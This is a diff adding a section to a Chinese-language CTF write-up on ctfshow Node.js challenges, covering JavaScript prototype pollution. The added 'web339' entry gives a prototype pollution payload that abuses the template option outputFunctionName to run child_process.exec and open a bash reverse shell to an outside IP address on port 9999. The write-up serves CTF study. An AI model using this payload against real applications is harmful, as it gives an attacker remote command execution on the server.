@@ -185,3 +185,15 @@ payload：**``{"__proto__":{"ctfshow":"36dboy"}}``**
 
 详细说明推荐p神文章：[深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)
 
+## web339
+
+![image-20220217000107791](image/ctfshow-nodejs(334-344)/image-20220217000107791.png)
+
+![image-20220217000003236](image/ctfshow-nodejs(334-344)/image-20220217000003236.png)
+
+
+
+``{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/42.193.107.62/9999 0>&1\"');var __tmp2"}}``
+
+
+
